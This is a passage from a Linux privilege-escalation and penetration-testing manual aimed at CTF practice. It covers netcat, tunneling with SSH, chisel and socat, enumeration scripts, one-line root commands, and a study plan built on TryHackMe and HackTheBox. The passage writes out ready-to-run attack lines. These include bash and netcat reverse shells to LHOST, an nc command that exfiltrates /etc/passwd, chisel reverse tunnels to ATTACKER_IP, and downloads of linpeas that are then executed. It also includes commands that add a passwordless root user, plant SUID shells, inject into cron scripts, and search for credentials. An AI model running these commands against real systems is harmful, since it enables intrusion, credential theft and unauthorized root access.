Netcat (nc) is the "Swiss army knife" of networking. It can:
- Create TCP/UDP connections
- Listen for incoming connections
- Transfer files
- Port scan
- Create bind and reverse shells
- Relay data

```bash
# Different versions (slightly different flags):
nc -h      # Check version/help
# "OpenBSD netcat" — common on modern Ubuntu, no -e flag
# "GNU netcat" / "Traditional nc" — has -e flag
which nc; ls -la $(which nc)    # What binary is it?
```

## 29.2 Netcat Complete Flag Reference

```bash
# Listening:
nc -l PORT              # Listen on PORT (basic)
nc -lvnp PORT           # Listen, verbose, numeric IPs, specific port
nc -lk PORT             # Listen and keep open after connection ends (-k)
nc -lu PORT             # Listen UDP

# Connecting:
nc TARGET PORT          # Connect to target
nc -v TARGET PORT       # Verbose connection
nc -vn TARGET PORT      # Verbose, no DNS resolution
nc -w 5 TARGET PORT     # Timeout: 5 seconds

# With shell (traditional nc):
nc -e /bin/bash TARGET PORT     # Connect and exec bash

# Flags:
-l     → listen mode
-v     → verbose
-vv    → very verbose
-n     → numeric IPs only (no DNS)
-p     → local port to use
-u     → UDP mode
-w N   → timeout N seconds
-z     → zero-I/O mode (port scan)
-k     → keep listening after connection ends
-e     → execute program (traditional nc only)
-c     → execute string via shell (alternative to -e)
-q N   → wait N seconds after EOF then quit
```

## 29.3 Netcat File Transfer

```bash
# Transfer file FROM victim TO attacker:
# Attacker (receive):
nc -lvnp 4444 > received_file

# Victim (send):
nc LHOST 4444 < /etc/passwd

# Transfer file FROM attacker TO victim:
# Attacker (send):
nc -lvnp 4444 < file_to_send

# Victim (receive):
nc LHOST 4444 > received_file

# Transfer binary files (use cat + redirect):
# Attacker: nc -lvnp 9999 < linpeas.sh
# Victim: nc LHOST 9999 > /tmp/linpeas.sh

# With progress (pipe through pv):
nc -lvnp 4444 | pv > received_file
```

## 29.4 Netcat Port Scanning

```bash
# TCP port scan:
nc -zv TARGET 80          # Single port
nc -zv TARGET 20-100      # Port range
nc -zvn TARGET 20-100 2>&1 | grep "succeeded"

# UDP port scan:
nc -zuv TARGET 53         # UDP port 53

# Quick port discovery:
for port in 22 80 443 3306 5432 6379 8080 8443; do
    nc -zv -w1 TARGET $port 2>&1 | grep "succeeded"
done
```

## 29.5 Netcat for Banner Grabbing

```bash
# Grab service banner:
echo "" | nc -vn -w 1 TARGET PORT

# HTTP banner:
echo -e "HEAD / HTTP/1.0\r\n\r\n" | nc -vn TARGET 80

# SSH banner:
nc -vn TARGET 22

# SMTP banner:
nc -vn TARGET 25
```

## 29.6 Netcat Relay / Port Forwarding

```bash
# Forward port 8080 to TARGET:80:
# (Old nc with -e):
nc -lvnp 8080 -e "nc TARGET 80"

# Without -e — using named pipe:
mkfifo /tmp/pipe
nc -lvnp 8080 < /tmp/pipe | nc TARGET 80 > /tmp/pipe
```

## 29.7 Alternatives When nc Is Not Available

```bash
# Check what's available:
which nc ncat netcat socat curl wget bash python python3 perl

# /dev/tcp (bash built-in):
bash -c 'cat < /dev/tcp/TARGET/PORT'   # Read from TCP
bash -c 'echo test > /dev/tcp/TARGET/PORT'  # Write to TCP

# Socat (better than nc):
socat TCP:TARGET:PORT -                   # Connect
socat TCP-LISTEN:PORT -                   # Listen
socat TCP-LISTEN:PORT EXEC:/bin/bash      # Bind shell

# Python:
python3 -c "
import socket
s = socket.socket()
s.connect(('TARGET', PORT))
print(s.recv(1024).decode())
"

# curl for HTTP banner:
curl -v http://TARGET:PORT/

# telnet (if available):
telnet TARGET PORT
```

---

# Chapter 30: Port Forwarding & Tunneling

## 30.1 SSH Local Port Forwarding

```bash
# Make internal service accessible locally:
ssh -L LOCAL_PORT:INTERNAL_HOST:INTERNAL_PORT USER@SSH_PIVOT

# Example: Access internal web app (only accessible on 10.10.10.5:80)
# via SSH server at 192.168.1.100:
ssh -L 8080:10.10.10.5:80 user@192.168.1.100
# Now browse: http://localhost:8080 → reaches 10.10.10.5:80

# Multiple forwards:
ssh -L 8080:10.10.10.5:80 -L 3306:10.10.10.6:3306 user@PIVOT
```

## 30.2 SSH Dynamic (SOCKS) Forwarding

```bash
# Create SOCKS5 proxy through SSH:
ssh -D 1080 user@PIVOT

# Use with proxychains:
# Edit /etc/proxychains.conf:
# socks5 127.0.0.1 1080

# Then:
proxychains nmap -sT -Pn 10.10.10.0/24
proxychains curl http://10.10.10.5
proxychains ssh user@10.10.10.5

# Firefox proxy: set manual SOCKS5 proxy to 127.0.0.1:1080
```

## 30.3 Chisel (Modern Tunneling Tool)

```bash
# Chisel is a fast tunneling tool over HTTP with auth support
# https://github.com/jpillora/chisel

# Attacker (server):
chisel server -p 8080 --reverse

# Victim (client) — create reverse SOCKS proxy:
chisel client ATTACKER_IP:8080 R:socks
# → Creates SOCKS proxy on attacker at 127.0.0.1:1080

# Then use proxychains through port 1080!

# Specific port forward (attacker accesses victim's internal 192.168.1.5:80):
# Victim:
chisel client ATTACKER_IP:8080 R:8888:192.168.1.5:80
# Attacker: curl http://localhost:8888 → goes to 192.168.1.5:80
```

## 30.4 socat Port Forwarding

```bash
# Simple TCP relay:
socat TCP-LISTEN:8080,fork TCP:TARGET:80
# Forwards all traffic from local 8080 to TARGET:80

# Bidirectional:
socat TCP-LISTEN:LOCAL_PORT,fork TCP:TARGET:REMOTE_PORT &
```

---

# PART X — CHECKLISTS & QUICK REFERENCE

---

# Chapter 31: Full Enumeration Checklist

## 31.1 Immediate Commands on Landing

Run these within the first 60 seconds of getting a shell:

```bash
# Who are you?
id; whoami; groups

# Basic system info:
uname -a; cat /etc/os-release

# Sudo privileges (most impactful!):
sudo -l

# SUID files (quick scan):
find / -perm -4000 -type f 2>/dev/null | head -20

# Capabilities:
getcap -r / 2>/dev/null

# Network:
ss -tulpn 2>/dev/null || netstat -tulpn 2>/dev/null

# Cron jobs:
cat /etc/crontab; ls /etc/cron.d/; crontab -l 2>/dev/null

# History files:
cat ~/.bash_history 2>/dev/null; cat ~/.zsh_history 2>/dev/null

# SSH keys:
ls -la ~/.ssh/ 2>/dev/null

# Interesting files:
find / -writable -type f 2>/dev/null | grep -v proc | head -20

# Env variables:
env | grep -iE 'pass|secret|key|token|api'

# Other users:
cat /etc/passwd | grep -v nologin | grep -v false

# Processes:
ps aux 2>/dev/null | head -30
```

## 31.2 Full Enumeration Script

```bash
#!/bin/bash
# Quick privesc enum — save as enum.sh

echo "=== IDENTITY ==="
id; whoami; groups

echo "=== OS/KERNEL ==="
uname -a
cat /etc/os-release 2>/dev/null | head -5

echo "=== SUDO ==="
sudo -l 2>/dev/null

echo "=== SUID/SGID ==="
find / -perm -4000 -o -perm -2000 -type f 2>/dev/null | head -30

echo "=== CAPABILITIES ==="
getcap -r / 2>/dev/null

echo "=== INTERESTING FILES ==="
find / -writable -not -path "*/proc/*" -not -path "*/sys/*" -type f 2>/dev/null | head -20
find / -name "*.conf" -readable -type f 2>/dev/null | head -20
find / -name "id_rsa" -o -name "id_dsa" 2>/dev/null

echo "=== ENVIRONMENT ==="
env
cat ~/.bash_history 2>/dev/null | head -20

echo "=== CRON ==="
cat /etc/crontab 2>/dev/null
ls /etc/cron.d/ 2>/dev/null
crontab -l 2>/dev/null

echo "=== NETWORK ==="
ss -tulpn 2>/dev/null || netstat -tulpn 2>/dev/null
cat /etc/hosts
cat /etc/resolv.conf

echo "=== PASSWORDS ==="
grep -ri "password" /etc/ 2>/dev/null | grep -v "#" | head -10
cat /etc/shadow 2>/dev/null | head -5

echo "=== INTERESTING ==="
ls -la /opt/ 2>/dev/null
ls -la /tmp/ 2>/dev/null
ls -la /var/tmp/ 2>/dev/null
```

---

# Chapter 32: Command Reference Card

## 32.1 Essential One-Liners

```bash
# ===== SYSTEM INFO =====
uname -a                                          # Full system info
cat /proc/version                                 # Kernel version
cat /etc/os-release                               # OS info
env                                               # All environment variables
ps aux                                            # All processes

# ===== SUID =====
find / -perm -u=s -type f 2>/dev/null            # SUID files
find / -perm -g=s -type f 2>/dev/null            # SGID files

# ===== CAPABILITIES =====
getcap -r / 2>/dev/null                           # All capabilities

# ===== WRITABLE =====
find / -writable -type f 2>/dev/null             # All writable files
find / -writable -type d 2>/dev/null             # All writable dirs

# ===== INTERESTING FILES =====
find / -name "*.sh" -type f 2>/dev/null          # Shell scripts
find / -name "id_rsa" 2>/dev/null                # SSH private keys
find / -name ".env" 2>/dev/null                  # Environment files
find / -name "wp-config.php" 2>/dev/null         # WordPress configs

# ===== CREDENTIALS =====
grep -ri "password" /etc/ 2>/dev/null
grep -ri "password" /var/www/ 2>/dev/null
cat ~/.bash_history
cat /root/.bash_history 2>/dev/null

# ===== SHELLS =====
# Reverse bash:
bash -i >& /dev/tcp/LHOST/LPORT 0>&1
# Reverse nc:
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc LHOST LPORT>/tmp/f
# Python PTY:
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Stabilize:
python3 -c 'import pty; pty.spawn("/bin/bash")'; [Ctrl+Z]; stty raw -echo; fg

# ===== NETWORK =====
ss -tulpn                                         # Listening ports
cat /etc/hosts                                    # Hosts file
ip route                                          # Routes

# ===== SUDO ESCAPES =====
# sudo vim:    sudo vim -c ':!/bin/bash'
# sudo find:   sudo find . -exec /bin/bash \; -quit
# sudo python: sudo python3 -c 'import os; os.system("/bin/bash")'
# sudo awk:    sudo awk 'BEGIN {system("/bin/bash")}'

# ===== GTFOBINS REFERENCE =====
# https://gtfobins.github.io/

# ===== PATH HIJACKING =====
export PATH=/tmp:$PATH; echo '/bin/bash -p' > /tmp/SERVICE_NAME; chmod +x /tmp/SERVICE_NAME

# ===== ADD ROOT USER =====
echo 'hacker::0:0:hacker:/root:/bin/bash' >> /etc/passwd; su hacker

# ===== SUID BASH =====
cp /bin/bash /tmp/bash; chmod +s /tmp/bash; /tmp/bash -p
```

---

# Chapter 33: CTF Methodology Flow

## 33.1 Decision Tree

```
START: Got initial shell
         │
         ▼
     Run: id, sudo -l
         │
    ┌────┴────────────────────────────┐
    │ sudo -l shows something?        │
    └─YES─► Check GTFOBins for sudo   │
            → EXPLOIT                 │
                                      │NO
                                      ▼
                                 Run SUID scan
                                 find / -perm -4000 -type f 2>/dev/null
                                      │
                               ┌──────┴──────────────────────┐
                               │ Unusual SUID binary?        │
                               └─YES─► Check GTFOBins/strings│
                                       → PATH hijack/escape  │
                                                             │NO
                                                             ▼
                                                    getcap -r / 2>/dev/null
                                                             │
                                                      ┌──────┴────────────┐
                                                      │ Dangerous caps?   │
                                                      └─YES─► cap_setuid  │
                                                             → setuid(0)  │
                                                                         │NO
                                                                         ▼
                                                              Check cron jobs
                                                              pspy64, /etc/crontab
                                                                         │
                                                               ┌─────────┴──────────┐
                                                               │ Writable script?   │
                                                               └─YES─► Inject shell │
                                                                                    │NO
                                                                                    ▼
                                                                        Check writable files
                                                                        /etc/passwd writable?
                                                                        /etc/sudoers writable?
                                                                                    │
                                                                                    ▼
                                                                            Check credentials
                                                                            History, configs
                                                                            .env files
                                                                                    │
                                                                                    ▼
                                                                           Check kernel version
                                                                           linux-exploit-suggester
                                                                           → Kernel exploit
```

## 33.2 Quick Win Checklist

```
□ sudo -l          → NOPASSWD anything?
□ SUID files       → python, perl, vim, find, bash in the list?
□ Capabilities     → cap_setuid, cap_dac_override on interpreter?
□ /etc/passwd      → writable?
□ /etc/shadow      → readable?
□ Cron jobs        → writable scripts?
□ History files    → passwords?
□ .env files       → credentials?
□ Internal ports   → redis, mysql without auth?
□ Docker group     → lxd group?
□ Kernel version   → known exploits?
□ PATH             → writable dir before /usr/bin?
□ NFS              → no_root_squash exports?
□ Backup files     → .bak, .old, .backup with credentials?
□ Config files     → database passwords?
```

---

## 📚 Essential Resources

```
TECHNIQUE REFERENCES:
GTFOBins              https://gtfobins.github.io/
HackTricks Linux      https://book.hacktricks.xyz/linux-hardening/privilege-escalation
PayloadsAllTheThings  https://github.com/swisskyrepo/PayloadsAllTheThings

VULNERABILITY SEARCH:
Exploit-DB            https://www.exploit-db.com/
CVEdetails            https://www.cvedetails.com/
SearchSploit CLI:     searchsploit "linux kernel 4.4"

SHELL GENERATION:
RevShells             https://www.revshells.com/

PRACTICE PLATFORMS:
HackTheBox            https://www.hackthebox.com/
TryHackMe             https://tryhackme.com/
VulnHub               https://www.vulnhub.com/

TOOLS:
PEASS-ng (LinPEAS)    https://github.com/carlospolop/PEASS-ng
pspy                  https://github.com/DominicBreuker/pspy
linux-exploit-suggester https://github.com/mzet-/linux-exploit-suggester
Chisel (tunneling)    https://github.com/jpillora/chisel
Static binaries       https://github.com/andrew-d/static-binaries

KEY CVES TO KNOW:
CVE-2021-4034  PwnKit      pkexec - all Linux distros
CVE-2022-0847  DirtyPipe   kernel 5.8-5.16
CVE-2016-5195  DirtyCOW    kernel 2.6-4.8
CVE-2021-3156  Baron Samedit sudo < 1.9.5p2
CVE-2019-14287 sudo -u#-1  sudo < 1.8.28
CVE-2011-2523  vsftpd backdoor vsftpd 2.3.4
```

---

## 🗺️ Appendix A: Common Linux File Locations Reference

```bash
# WEB ROOTS (shell upload destinations):
/var/www/html/             # Apache default
/var/www/                  # Alternative
/srv/http/                 # Arch Linux
/usr/share/nginx/html/     # Nginx default

# LOG FILES (for LFI log poisoning):
/var/log/apache2/access.log
/var/log/nginx/access.log
/var/log/auth.log          # Auth events (SSH login attempts!)
/var/log/syslog
/var/log/vsftpd.log        # FTP (inject via username)

# SENSITIVE CONFIG FILES:
/etc/passwd                # Users
/etc/shadow                # Hashes
/etc/sudoers               # Sudo rules
/etc/exports               # NFS exports
/etc/crontab               # Cron jobs
/etc/ssh/sshd_config       # SSH config

# CREDENTIAL LOCATIONS:
/root/.bash_history
/home/*/.bash_history
/var/www/html/wp-config.php
/var/www/html/.env
/opt/**/.env
/home/*/.ssh/id_rsa
/root/.ssh/id_rsa

# WRITABLE TEMP DIRS:
/tmp/                      # World-writable
/var/tmp/                  # Persistent across reboots
/dev/shm/                  # RAM-based, fast
```

## 🗺️ Appendix B: One-Step Root Commands

```bash
# /etc/passwd writable:
echo 'r::0:0::/root:/bin/bash' >> /etc/passwd && su r

# SUID python3:
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# sudo find (NOPASSWD):
sudo find . -exec /bin/bash \; -quit

# sudo vim (NOPASSWD):
sudo vim -c ':!/bin/bash'

# sudo python3 (NOPASSWD):
sudo python3 -c 'import os; os.system("/bin/bash")'

# sudo awk (NOPASSWD):
sudo awk 'BEGIN {system("/bin/bash")}'

# cap_setuid on python3:
python3 -c 'import os; os.setuid(0); os.setgid(0); os.system("/bin/bash")'

# SUID bash copy:
cp /bin/bash /tmp/b && chmod +s /tmp/b && /tmp/b -p

# docker group:
docker run -it --rm -v /:/mnt ubuntu chroot /mnt bash

# NFS no_root_squash (from attacker as root):
# sudo mount -t nfs TARGET:/share /mnt/nfs
# sudo cp /bin/bash /mnt/nfs/bash && sudo chmod +s /mnt/nfs/bash
# On target: /share/bash -p

# Writable cron script:
echo 'cp /bin/bash /tmp/b && chmod +s /tmp/b' >> /path/to/root_cron.sh
# Wait 1 minute: /tmp/b -p
```

---

*This manual is intended for ethical hacking, CTF competitions, and authorized penetration testing only.*

---

# PART XI — PRACTICE LABS, ROOMS & LEARNING METHODOLOGY

---

# Chapter 38: How to Actually Learn Privilege Escalation — The Right Method

## 38.1 The Real Question: Learn First vs Jump In?

This is one of the most common questions from beginners. The honest, experience-based answer is: **neither extreme works alone**. Here is why, and what actually does work.

### Why "Read Everything First" Fails

```
Week 1: Read about SUID       → "Got it, makes sense"
Week 2: Read about sudo       → "Got it, makes sense"
Week 3: Read about cron jobs  → "Got it, makes sense"
Week 4: Start first machine   → "Wait... where do I even begin?"
         → Open machine → nmap done → see Apache → go completely blank
         → Forgot 80% because you never APPLIED it

Memory science: Reading without practice = ~10% retention after 1 week.
```

### Why "Just Dive In" Fails

```
Day 1: Start machine → nmap done → "Now what?"
       → Google "how to hack linux machine"
       → Find walkthrough → Copy commands → Get root
       → Learned nothing. You followed a recipe.

Day 10: Different machine → exact same problem.
        Walkthroughs became a crutch.
        You developed zero independent problem-solving.
```

### What Actually Works: Concept-Practice Spirals

The proven method is short theory bursts followed by **immediate** hands-on application:

```
SPIRAL 1 (Day 1-2): SUID Exploitation
  30 min:  Read Chapter 11 of this book (SUID theory)
  90 min:  THM Linux PrivEsc room — SUID tasks only
  90 min:  THM RootMe machine (SUID is the privesc path)
  Result:  SUID exploitation is muscle memory, not just theory

SPIRAL 2 (Day 3-4): Sudo Exploitation
  30 min:  Read Chapter 15 (Sudo misconfigs)
  90 min:  THM Linux PrivEsc room — sudo tasks only
  90 min:  THM Simple CTF machine (sudo privesc in the wild)
  Result:  sudo -l becomes your absolute first instinct on any box

SPIRAL 3 (Day 5-6): Cron & File Permissions
  30 min:  Read Chapter 13 (Cron jobs)
  90 min:  THM Skynet machine (cron wildcard injection)
  45 min:  Run pspy on a machine — watch root's cron execute
  Result:  You recognize writable cron scripts by habit

SPIRAL 4 (Week 2): Web Initial Access
  60 min:  Read Chapter 0b (dense — give it time)
  3 days:  THM OWASP Top 10 room (one task per study session)
  1 day:   THM File Inclusion room (LFI mastery)
  1 day:   THM Upload Vulnerabilities room
  Result:  Web vulnerabilities no longer feel foreign

INTEGRATION (Week 3): Chain everything together
  THM Mr Robot CTF    — web enum + SUID (two spirals combined)
  THM Skynet          — web + cron (two spirals combined)
  VulnHub DC-1        — CMS exploit + SUID find (new platform)

INDEPENDENT (Week 4+): Minimal guidance
  HTB Starting Point Tier 0 → Tier 1 → Tier 2
  VulnHub Kioptrix series
  THM harder rooms — NO hints for minimum 1 hour

ADVANCED (Month 2+): Real machine pace
  HTB Retired Easy machines (community writeups only after solving)
  VulnHub Intermediate machines
  Write your own step-by-step notes after each machine
```

## 38.2 How to Use This Book During Live Practice

```
BEFORE starting a machine:
→ Skim the relevant chapter for the technique you expect to face
→ Keep Chapter 35 (Command Reference) open in a second window
→ Have Chapter 34 (Enumeration Checklist) ready to follow

WHILE working the machine:
→ Got a shell? Run the Phase 1 commands from Chapter 34.1 immediately
→ Found sudo -l output? Open Chapter 15 for exploitation
→ Found a SUID binary? Open Chapter 11
→ Found a cron entry? Open Chapter 13
→ Completely stuck? Go through the Chapter 36 decision tree line by line

AFTER solving:
→ Read a community writeup regardless of whether you solved it
→ Find two things: what you missed, and what was faster
→ Write your own 5-bullet summary in your notes

WHEN STUCK (30+ minutes):
→ Re-run linpeas.sh — you almost certainly missed something
→ Run pspy — is root executing something you haven't seen?
→ Go back through Chapter 34 checklist line by line
→ Check services on localhost that aren't exposed externally
→ Only after 1 genuine hour: look at one small hint
```

## 38.3 Your Personal Progress Tracker

Check these off only when you have successfully exploited the technique on a real machine — not just read about it:

```
SUID EXPLOITATION:
[ ] Exploited SUID python/python3 (os.setuid)
[ ] Exploited SUID bash (-p flag)
[ ] Exploited SUID vim/nano (:!/bin/bash)
[ ] Exploited SUID find (-exec /bin/bash)
[ ] Exploited SUID nmap (--interactive or --script)
[ ] Exploited SUID cp (overwrite /etc/passwd)
[ ] Exploited custom SUID binary via PATH hijack
[ ] Analyzed unknown SUID binary with strings/strace

SUDO EXPLOITATION:
[ ] Exploited sudo find
[ ] Exploited sudo vim or less
[ ] Exploited sudo python/perl/ruby/awk
[ ] Exploited sudo tar or zip
[ ] Exploited sudo with env_keep LD_PRELOAD
[ ] Exploited sudo with writable script
[ ] Exploited CVE-2019-14287 (sudo -u#-1)
[ ] Exploited CVE-2021-3156 (Baron Samedit)

CRON/SCHEDULED TASKS:
[ ] Exploited writable cron script
[ ] Exploited cron PATH (malicious binary)
[ ] Exploited tar wildcard injection via cron
[ ] Discovered hidden cron job using pspy

FILE PERMISSIONS:
[ ] Exploited writable /etc/passwd
[ ] Read /etc/shadow and cracked a hash
[ ] Exploited writable /etc/sudoers
[ ] Found and used an SSH private key

ENVIRONMENT VARIABLES:
[ ] PATH hijacked a SUID or cron binary
[ ] Exploited LD_PRELOAD via sudo env_keep
[ ] Exploited PYTHONPATH or PERL5LIB module injection

CAPABILITIES:
[ ] Exploited cap_setuid on python/perl
[ ] Exploited cap_dac_override on vim/python

NFS:
[ ] Mounted NFS share with no_root_squash
[ ] Created SUID binary via NFS mount to escalate

KERNEL:
[ ] Identified vulnerable kernel with exploit-suggester
[ ] Successfully ran a kernel exploit to root

CONTAINERS:
[ ] Escaped a privileged Docker container
[ ] Escaped via Docker socket
[ ] Escaped via LXD group membership

WEB INITIAL ACCESS:
[ ] Exploited SQL injection manually
[ ] Exploited SQL injection with sqlmap
[ ] Exploited LFI to read /etc/passwd
[ ] Exploited LFI log poisoning to get RCE
[ ] Bypassed file upload filter → PHP shell → reverse shell
[ ] Exploited command injection
[ ] Used default credentials successfully
[ ] Brute-forced web login with hydra

CREDENTIAL HUNTING:
[ ] Found passwords in bash history
[ ] Found DB credentials in config files
[ ] Found and used an SSH key
[ ] Reused credentials across multiple services
[ ] Cracked a shadow file hash offline

FULL MACHINES COMPLETED:
[ ] THM: Linux PrivEsc room
[ ] THM: Linux PrivEsc Arena
[ ] THM: Simple CTF
[ ] THM: RootMe
[ ] THM: Skynet
[ ] THM: Mr Robot CTF
[ ] HTB Starting Point: All Tier 0
[ ] HTB Starting Point: All Tier 1
[ ] VulnHub: Kioptrix Level 1
[ ] VulnHub: DC-1
[ ] VulnHub: Mr-Robot
[ ] VulnHub: HackLAB Vulnix (NFS focused)
[ ] VulnHub: Stapler (multi-service)
[ ] HTB Retired Easy: Shocker
[ ] HTB Retired Easy: Bashed
[ ] HTB Retired Easy: Nibbles
```

---

# Chapter 39: Universal Machine Methodology — Step by Step

Use this exact workflow on every single machine, every time. Consistency builds instinct faster than anything else.

## 39.1 Workspace Setup (Before Touching the Target)

```bash
# Create organized directory structure:
mkdir -p ~/boxes/MACHINENAME/{nmap,web,exploit,loot,notes}
cd ~/boxes/MACHINENAME

# Record target IP as a variable (saves typing, avoids typos):
export TARGET=10.10.10.X
echo "[*] Target: $TARGET"

# Open these simultaneously:
# Terminal 1: Main recon and exploitation work
# Terminal 2: Netcat listener (nc -lvnp 4444) — ALWAYS ready
# Terminal 3: HTTP server for file transfers (python3 -m http.server 8000)
# Text editor: notes.md — note EVERYTHING you find

# Start a log of your session:
script ~/boxes/MACHINENAME/session.log
# (Ctrl+D to stop logging later)
```

## 39.2 Step 1 — Reconnaissance

```bash
# --- PHASE A: Fast port discovery ---
# Goal: find ALL open ports as quickly as possible
nmap -p- --min-rate 5000 -T4 $TARGET -oN nmap/ports.txt
# Read the output: write down every open port number

# Extract just the port numbers for next command:
grep "^[0-9]" nmap/ports.txt | cut -d'/' -f1 | tr '\n' ',' | sed 's/,$//'
# Example output: 22,80,443,8080

# --- PHASE B: Deep scan on open ports ---
# Goal: exact versions, default script results
nmap -sV -sC -p 22,80,443 $TARGET -oN nmap/detailed.txt

# READ the detailed output carefully and ask:
# - What is the EXACT version of each service?
# - What do the NSE scripts reveal? (directories, hostnames, etc.)
# - Are there hostnames in TLS certificates? (add to /etc/hosts!)
# - Any unusual or unexpected services?

# --- PHASE C: UDP scan (if TCP is thin) ---
sudo nmap -sU --top-ports 20 $TARGET -oN nmap/udp.txt
# SNMP (161), DNS (53), TFTP (69), NFS (2049) — check these!

# --- PHASE D: Web-specific scans (if HTTP found) ---
nmap --script=http-enum,http-title,http-methods -p 80,443,8080 $TARGET -oN nmap/web_scripts.txt
```

## 39.3 Step 2 — Service Investigation

```bash
# Work through EACH open port systematically.
# NEVER skip a port assuming it's unimportant.

# HTTP/HTTPS (always first — richest attack surface):
curl -I http://$TARGET                          # Headers reveal tech stack
curl -s http://$TARGET/ | head -50              # Page source
curl http://$TARGET/robots.txt                  # Hidden paths
curl http://$TARGET/sitemap.xml                 # Sitemap
whatweb http://$TARGET                          # Technology fingerprint

# Directory brute force — ALWAYS run this in background:
gobuster dir \
    -u http://$TARGET \
    -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt \
    -x php,txt,html,bak,old,backup,zip,conf,sql,xml \
    -t 50 \
    -o web/gobuster.txt &
# Let it run while you investigate manually

# FTP (port 21):
ftp $TARGET          # Try: anonymous / anonymous
# If anonymous works: ls -la, get everything, try to upload

# SSH (port 22):
# Note the version for exploit research
# Try default creds only if you have no other leads
# Save SSH as "known valid login method" once you have creds

# SMB (ports 139/445):
smbclient -L //$TARGET -N              # List shares anonymously
enum4linux -a $TARGET                  # Full SMB enumeration

# SNMP (port 161 UDP):
snmp-check $TARGET -c public
onesixtyone $TARGET public
```

## 39.4 Step 3 — Vulnerability Research & Initial Access

```bash
# For each service version found, search for vulnerabilities:
searchsploit "Apache 2.4.29"
searchsploit "vsftpd 2.3.4"
searchsploit "OpenSSH 7.6"

# Google search pattern: "[Service] [Version] exploit site:exploit-db.com"
# Or: "[Service] [Version] CVE"

# Set up listener BEFORE exploiting:
nc -lvnp 4444
# In another terminal: rlwrap nc -lvnp 4444 (adds history/arrows)

# After getting a shell — IMMEDIATELY stabilize:
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo
fg
# Press Enter twice
export SHELL=bash
export TERM=xterm-256color
stty rows 38 cols 150  # Match your terminal size
```

## 39.5 Step 4 — Post-Exploitation Enumeration (Muscle Memory)

**Run these in this exact order every time. Never skip.**

```bash
# ===== SECTION 1: Identity & immediate wins =====
id; whoami; hostname; groups
sudo -l 2>/dev/null          # ALWAYS check this first — biggest time saver
cat /etc/os-release; uname -r

# ===== SECTION 2: Automated enumeration =====
# Upload linpeas (from attacker: python3 -m http.server 8000):
wget http://LHOST:8000/linpeas.sh -O /tmp/lp.sh 2>/dev/null || \
curl -s http://LHOST:8000/linpeas.sh -o /tmp/lp.sh
chmod +x /tmp/lp.sh
/tmp/lp.sh 2>/dev/null | tee /tmp/lp_out.txt

# Upload pspy (monitor processes):
wget http://LHOST:8000/pspy64 -O /tmp/pspy 2>/dev/null || \
curl -s http://LHOST:8000/pspy64 -o /tmp/pspy
chmod +x /tmp/pspy
/tmp/pspy -i 200 2>/dev/null &  # Run in background

# ===== SECTION 3: Manual enumeration checklist =====

# SUID binaries:
find / -perm -u=s -type f 2>/dev/null | tee /tmp/suid.txt
# Check each against GTFOBins immediately

# Capabilities:
getcap -r / 2>/dev/null

# Cron jobs:
cat /etc/crontab 2>/dev/null
ls -la /etc/cron.d/ 2>/dev/null && cat /etc/cron.d/* 2>/dev/null
crontab -l 2>/dev/null

# Writable files:
find / -writable -type f 2>/dev/null | grep -vE "/proc|/sys|/dev|/run" | tee /tmp/writable.txt

# Network:
ss -tulpn 2>/dev/null || netstat -tulpn 2>/dev/null
cat /etc/hosts

# Credentials:
cat ~/.bash_history 2>/dev/null
cat /home/*/.bash_history 2>/dev/null
find / -name "*.env" -o -name "wp-config.php" -o -name "config.php" 2>/dev/null | \
    xargs cat 2>/dev/null | grep -iE "pass|secret|key|token" | head -30

# Users with shells:
cat /etc/passwd | grep -vE "nologin|false"

# SSH keys:
find / -name "id_rsa" -o -name "id_dsa" -o -name "id_ed25519" 2>/dev/null

# NFS:
cat /etc/exports 2>/dev/null
showmount -e localhost 2>/dev/null

# Docker/containers:
ls /.dockerenv 2>/dev/null && echo "IN DOCKER CONTAINER"
id | grep -qE "docker|lxd" && echo "PRIVILEGED GROUP FOUND"
cat /proc/1/cgroup 2>/dev/null | head -5

# ===== SECTION 4: After pspy runs 2+ minutes =====
# Kill pspy and review output:
kill %1 2>/dev/null
cat /tmp/pspy_* 2>/dev/null | grep "UID=0" | head -30
# Look for: what commands does root execute? what scripts run?
```

## 39.6 Step 5 — Privilege Escalation (Use the Decision Tree)

```bash
# Follow Chapter 36.2 decision tree — in order of likelihood:

# 1. sudo -l output — check against GTFOBins immediately
# 2. Unusual SUID binaries — check GTFOBins + strings/strace
# 3. Dangerous capabilities — cap_setuid → setuid(0) → bash
# 4. Credentials found — try as root via su, ssh
# 5. Writable cron scripts — append reverse shell payload
# 6. Writable /etc/passwd — add root user
# 7. NFS with no_root_squash — SUID binary via mount
# 8. Container escape — privileged container, docker socket, lxd
# 9. Kernel exploit — last resort
```

## 39.7 Step 6 — Post-Root Actions

```bash
# Get the flag:
cat /root/root.txt
cat /root/flag.txt
find /root -name "*.txt" 2>/dev/null

# LOOT — collect for learning:
cat /etc/shadow              # Save all hashes for offline practice
cat /root/.bash_history      # What did root do on this machine?
find /root -type f 2>/dev/null | xargs ls -la 2>/dev/null
cat /root/.ssh/id_rsa 2>/dev/null    # Root's private key

# UNDERSTAND — the most important step:
# Ask yourself: "Why did this work?"
# Write in your notes:
#   → What was the misconfiguration?
#   → How would you find this faster next time?
#   → What did you try that DIDN'T work and why?
```

---

# Chapter 40: TryHackMe — Complete Free Room Guide

## 40.1 Platform Setup

```bash
# 1. Create free account: https://tryhackme.com
# 2. Download OpenVPN config from: https://tryhackme.com/access
sudo openvpn ~/Downloads/USERNAME.ovpn &

# Verify connectivity:
ping 10.10.X.X    # Should respond once machine is deployed

# Alternative: Use AttackBox (browser-based Kali)
# → No VPN needed, 1 hour/day free
# → Access from the room page — click "Start AttackBox"
```

## 40.2 Phase 1 — Linux Fundamentals (Week 1)

| Room | URL | Free | Time | Book Chapter |
|------|-----|------|------|------|
| Linux Fundamentals Pt 1 | /room/linuxfundamentalspart1 | ✅ | 1hr | Ch 1 |
| Linux Fundamentals Pt 2 | /room/linuxfundamentalspart2 | ✅ | 1hr | Ch 1.1 |
| Linux Fundamentals Pt 3 | /room/linuxfundamentalspart3 | ✅ | 1hr | Ch 13 |
| OverTheWire: Bandit | overthewire.org/wargames/bandit | ✅ | 5+hrs | All |

**OverTheWire Bandit** (levels 0-20 minimum):
```
URL: https://overthewire.org/wargames/bandit/
This is NOT TryHackMe — it's a separate free wargame.
It FORCES you to become comfortable with the Linux CLI.
